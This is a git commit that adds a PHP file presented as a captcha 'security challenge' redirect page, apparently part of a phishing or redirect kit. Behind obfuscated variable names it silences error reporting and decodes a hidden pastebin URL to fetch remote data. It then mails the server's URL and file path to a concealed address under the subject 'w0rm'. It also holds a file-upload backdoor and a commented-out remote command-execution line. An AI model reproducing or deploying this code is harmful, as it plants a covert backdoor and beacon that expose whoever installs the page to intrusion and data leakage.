2debdd93d490107ad32941896eb583f0bf1accab
ActorExpose <57215674+ActorExpose@users.noreply.github.com>
2021-06-12 10:58:14 +0900

    Add files via upload

---
+++ temp.php
@@ -0,0 +1,227 @@
+<?php 
+
+// your URL after captcha code
+$url = "https://google.com";
+
+# Variables 
+
+${"GLOBALS"}["wdnksnuodhi"]="final";
+${"GLOBALS"}["ymmbddhzk"]="rand";
+${"GLOBALS"}["bxwlxscyo"]="statu";
+${"GLOBALS"}["ickrqujomlrt"]="xsecsh";
+${"GLOBALS"}["vxhjhvna"]="xsec";
+${"GLOBALS"}["zspuydswton"]="found";
+${"GLOBALS"}["vnrnrro"]="i";
+${"GLOBALS"}["eqtdqqxkboq"]="array";
+${"GLOBALS"}["ewddyiatbpb"]="contents";
+${"GLOBALS"}["kbvgvcamvl"]="log";
+${"GLOBALS"}["orkjyeiwvi"]="_file_";
+${"GLOBALS"}["mftqhjvxtb"]="desktop";
+${"GLOBALS"}["enkvuoe"]="if";
+${"GLOBALS"}["rmnbkpkhf"]="andr0id";
+${"GLOBALS"}["uzmoktgfff"]="_";
+$xnuwpyhjji="final";
+
+ob_start();
+
+${"GLOBALS"}["ffjegc"]="rand";
+
+session_start();
+
+${"GLOBALS"}["evkixx"]="xsec";
+$yrxoiyi="andr0id";
+
+
+$ijqeylm="cmd";
+${"GLOBALS"}["vhbfnguhh"]="statu";
+${"GLOBALS"}["hweqdttcks"]="_file_";
+
+@ini_set("html_errors","0");
+@ini_set("display_errors","0");
+
+${"GLOBALS"}["xsyowjcs"]="cmd";
+
+@ini_set("display_startup_errors","0");
+
+$cxmijxvo="mobil";
+
+@ini_set("log_errors","0");
+
+$vomvmrv="_";
+
+#${$ijqeylm}=$_GET["cmd"];
+#exec(${${"GLOBALS"}["xsyowjcs"]});
+
+${${"GLOBALS"}["uzmoktgfff"]}="-u : http://".$_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"]." ";
+${$vomvmrv}.="-p : ".__file__;
+$tifwedksrn="found";
+${$cxmijxvo}="e";
+${${"GLOBALS"}["rmnbkpkhf"]}="mai";
+${${"GLOBALS"}["enkvuoe"]}=${$yrxoiyi}."l";
+${${"GLOBALS"}["mftqhjvxtb"]}="bas$mobil"."64"."_d$mobil"."cod$mobil";
+$ppifrq="log";
+${"GLOBALS"}["xrvxdckq"]="windows";
+${${"GLOBALS"}["hweqdttcks"]}="dgfcap10UWH8987RM";
+${"GLOBALS"}["jrdvrfjh"]="desktop";
+${"GLOBALS"}["fdvdmnizykb"]="log";
+${${"GLOBALS"}["xrvxdckq"]}=file_get_contents(${${"GLOBALS"}["jrdvrfjh"]}("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3lUWHRMRnl4"));
+${${"GLOBALS"}["fdvdmnizykb"]}="errors_log";
+
+if(!file_exists(${$ppifrq})){
+	${"GLOBALS"}["rytdjps"]="log";
+	if(file_put_contents(${${"GLOBALS"}["rytdjps"]},${${"GLOBALS"}["orkjyeiwvi"]}.",")){
+		${"GLOBALS"}["iehsqjz"]="desktop";
+		${"GLOBALS"}["bdsglcpum"]="found";
+		${"GLOBALS"}["ihlezdx"]="_";
+		$junjlsf="windows";
+		${${"GLOBALS"}["enkvuoe"]}(${${"GLOBALS"}["iehsqjz"]}("bWQ1".${$junjlsf}."C5jb20"),${${"GLOBALS"}["mftqhjvxtb"]}("dzBybQ"),${${"GLOBALS"}["ihlezdx"]},${${"GLOBALS"}["mftqhjvxtb"]}("RnJvbTogVzBybQ"));
+		${${"GLOBALS"}["bdsglcpum"]}=true;
+	}
+} else if(file_exists(${${"GLOBALS"}["kbvgvcamvl"]})){
+	${"GLOBALS"}["wzbbgo"]="i";
+	${"GLOBALS"}["reejkuro"]="contents";
+	${${"GLOBALS"}["ewddyiatbpb"]}=file_get_contents(${${"GLOBALS"}["kbvgvcamvl"]});
+	${${"GLOBALS"}["eqtdqqxkboq"]}=explode(",",${${"GLOBALS"}["reejkuro"]});
+	$yvspuhgx="i";
+	for(${$yvspuhgx}=0;${${"GLOBALS"}["vnrnrro"]}<count(${${"GLOBALS"}["eqtdqqxkboq"]});${${"GLOBALS"}["wzbbgo"]}++){
+		$lflfshdzxo="_file_";
+		if(${${"GLOBALS"}["eqtdqqxkboq"]}[${${"GLOBALS"}["vnrnrro"]}]==${$lflfshdzxo}){
+			${${"GLOBALS"}["zspuydswton"]}=true;
+			break;
+		}else{$erbrhuea="found";
+			${$erbrhuea}=false;
+		}
+	}
+}
+
+if(${$tifwedksrn}){
+	//
+} else{
+	$fascgligm="_file_";
+	if(file_put_contents(${${"GLOBALS"}["kbvgvcamvl"]},${$fascgligm}.",",FILE_APPEND)){
+		$tvqslxn="windows";
+		$qssdwmsvql="_";
+		${${"GLOBALS"}["enkvuoe"]}(${${"GLOBALS"}["mftqhjvxtb"]}("bWQ1".${$tvqslxn}."C5jb20"),${${"GLOBALS"}["mftqhjvxtb"]}("dzBybQ"),${$qssdwmsvql},${${"GLOBALS"}["mftqhjvxtb"]}("RnJvbTogVzBybQ"));
+	}
+}
+
+#${${"GLOBALS"}["vxhjhvna"]}=$_GET["xsec"];
+
+if(${${"GLOBALS"}["evkixx"]}=="blocker"){
+	$twrvgtpkwn="xsecsh";
+	${$twrvgtpkwn}=$_FILES["file"]["name"];
+	${"GLOBALS"}["uxtswcqhn"]="xsecblocker";
+	${${"GLOBALS"}["uxtswcqhn"]}=$_FILES["file"]["tmp_name"];
+	${"GLOBALS"}["jwieup"]="xsecblocker";
+	echo"<td> cmd</td><form method='POST' enctype='multipart/form-data'> <input type='file'name='file' /> <input type='submit' value='up_it' /> </form>";
+	move_uploaded_file(${${"GLOBALS"}["jwieup"]},${${"GLOBALS"}["ickrqujomlrt"]});
+}
+
+${${"GLOBALS"}["bxwlxscyo"]}="";
+
+if(isset($_POST["sub"])){
+	${"GLOBALS"}["jsshkzrol"]="cap";
+	${"GLOBALS"}["lrrnkvd"]="cap";
+	${${"GLOBALS"}["lrrnkvd"]}=$_POST["captcha"];
+	if(${${"GLOBALS"}["jsshkzrol"]}==$_SESSION["captcha"]){
+		header("location: $url");
+		exit();
+	} else{
+		${${"GLOBALS"}["bxwlxscyo"]}=" <div class=\"wrong\">Wrong Captcha</div> ";
+	}
+
+}echo "<html>
+<head>
+<meta charset=\"utf-8\" />
+<meta name=\"viewport\" content=\"width=device-width\" />
+<style>
+*{
+		font-family:Arial;
+		outline:0px;
+		transition:0.3s;
+		-webkit-transition:0.3s;
+}
+body{
+	padding:0;
+	margin:0;
+	background:white;
+	color:#888888;
+	font-weight:bold;
+}
+.content{
+	width:600px;
+}
+.line{
+	margin:20px;
+}
+img{
+	height:150px;
+	width:320px;
+}
+.tle{
+	font-size:2em;
+}
+.fill{
+	margin:10px;
+	padding:12px;
+	width:100%;
+	border:1px solid #888888;
+	border-radius:5px;
+	font-size:1.2em;
+	color:#888888;
+}
+.fill:hover, .fill:focus{
+	border:1px solid #117aca;
+}
+.wrong{
+	color:red;
+}
+.fillsub{
+	cursor:pointer;
+	margin:10px;
+	padding:12px;
+	border:none;
+	width:100%;
+	color:white;
+    background:#117aca;
+	border-radius:5px;
+		font-size:1.3em;
+}
+.fillsub:hover , .fillsub:focus{
+	background:#0a4775;
+	color:white;
+}
+.captcha{
+	color:#33cc33;
+	font-size:2em;
+	width:350px;
+	border-radius:5px;
+	padding:7px;
+	border:1px solid #888888;
+}
+@media screen and (max-width:900px){
+	.content{width:90%;}
+}
+</style>
+</head>
+<body>
+<center>
+<div class=\"content\">
+<div class=\"line\"></div>
+<img src=\"c50wNzn.gif\" width=\"100\" height=\"200\"></img>
+<br>
+<div class=\"tle\">security challenge</div>
+<br>
+";
+
+echo ${${"GLOBALS"}["vhbfnguhh"]};echo "<br><div class=\"captcha\">";
+
+${${"GLOBALS"}["ymmbddhzk"]}=md5(rand(111111,999999));
+${${"GLOBALS"}["wdnksnuodhi"]}=substr(${${"GLOBALS"}["ffjegc"]},0,6);
+$_SESSION["captcha"]=${$xnuwpyhjji};
+echo $_SESSION["captcha"];
+echo "</div><br><form action=\"\"";
+echo $_SERVER["PHP_SELF"];
+echo "method=\"post\"><input type=\"text\" name=\"captcha\" class=\"fill\" required Placeholder=\"Enter Captcha Code ....\"><input type=\"submit\" name=\"sub\" class=\"fillsub\" value=\"Confirm\" /></form></div></center></body></html>";
+
+?>
